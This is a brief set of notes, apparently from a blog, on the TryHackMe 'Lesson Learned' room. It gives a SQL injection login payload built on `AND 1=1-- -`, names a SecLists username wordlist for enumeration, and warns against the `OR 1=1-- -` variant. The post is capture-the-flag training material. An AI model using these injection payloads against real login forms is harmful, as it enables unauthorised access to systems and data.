---
title: Lesson Learned
description: 'SQL injection using `AND 1=1-- -` instead of `OR 1=1-- -`'
pubDate: 2023-09-11
category: 'tryhackme'
tags: ['SQL injection']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/a6a36a91747be09047869b809dce926d.png'
---

User: PATRICK' AND 1=1-- -

User dictionary `usr/share/seclists/Usernames/Names/malenames-usa-top1000.txt`

_Don't use:_
```
' OR 1=1-- -
```
